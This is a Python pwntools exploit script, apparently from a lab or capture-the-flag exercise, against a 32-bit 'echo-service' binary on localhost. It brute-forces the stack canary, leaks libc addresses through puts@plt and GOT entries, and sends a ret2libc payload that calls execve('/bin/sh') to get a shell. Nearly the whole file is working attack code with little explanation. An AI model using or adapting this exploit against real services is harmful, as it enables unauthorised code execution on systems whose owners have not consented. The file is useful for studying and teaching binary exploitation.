from pwn import *
import time

server = 'localhost'
port = 9999

canary = ''

prefix = 64 * 'a'

def getCanary():
    global server, port, canary, prefix
    for i in range(4):
        for j in range(256):
            if j == 10:
                continue
            charact = p8(j)

            p = connect(server, port)

            p.sendline(prefix + canary + charact + '\n')
            time.sleep(0.2)
            p.sendline('a')
            time.sleep(0.2)

            if p.connected():
                print('found byte ' + str(i)
                    + ', decimal value: ' + str(j))
                p.close()
                time.sleep(0.2)
                canary += charact
                break

canary = p32(0x661f9100)
#getCanary()
print ('WYKRYTY KANAREK: ' + hex(u32(canary)))

canary_pass = prefix + canary
filling = cyclic(12)

bin_elf = ELF('./echo-service')

echo_addr = bin_elf.symbols['echo']
puts_plt = bin_elf.symbols['plt.puts']

print('adres puts@plt: ' + hex(puts_plt))
print('adres funkcji echo: ' + hex(echo_addr))

const_payload = canary_pass + filling + p32(puts_plt) + p32(echo_addr)

def leak(addr):
    global const_payload, server, port
    p = connect(server, port)
    p.recvline()
    time.sleep(0.2)
    p.sendline(const_payload + p32(addr) + '\n')
    time.sleep(0.2)
    last_line = ''
    res = ''
    p.recvline()
    time.sleep(0.2)
    last_line = p.recvline()
    res = last_line[:4]
    if len(res) != 4:
        print('address is not 4 bytes long!')
    p.close()
    time.sleep(0.2)
    return res


fflush_got = bin_elf.symbols['got.fflush']
print('fflush_got: ' + hex(fflush_got))
fflush_addr = u32(leak(fflush_got))
print('fflush_addr: ' + hex(fflush_addr))

puts_got = bin_elf.symbols['got.puts']
print('puts_got: ' + hex(puts_got))
puts_addr = u32(leak(puts_got))
print('puts_addr: ' + hex(puts_addr))

fflush_offset = 0x0005f0f0
print('fflush_offset: ' + hex(fflush_offset))
puts_offset = 0x00060ff0
print('puts_offset: ' + hex(puts_offset))

libc_base1 = fflush_addr - fflush_offset
libc_base2 = puts_addr - puts_offset

print('libc_base1: ' + hex(libc_base1))
print('libc_base2: ' + hex(libc_base2))

execve_offset = 0x0009e9b0
print('execve_offset: ' + hex(execve_offset))
binsh_offset = 0x0012bf8f
print('binsh_offset: ' + hex(binsh_offset))

execve_addr = libc_base1 + execve_offset
print('execve_addr: ' + hex(execve_addr))
binsh_addr = libc_base1 + binsh_offset
print('binsh_addr: ' + hex(binsh_addr))

payload = canary_pass + filling + p32(execve_addr) + p32(echo_addr) + p32(binsh_addr) + p32(0) + p32(0) + '\n'

print payload

p = connect(server, port)
p.sendline(payload)

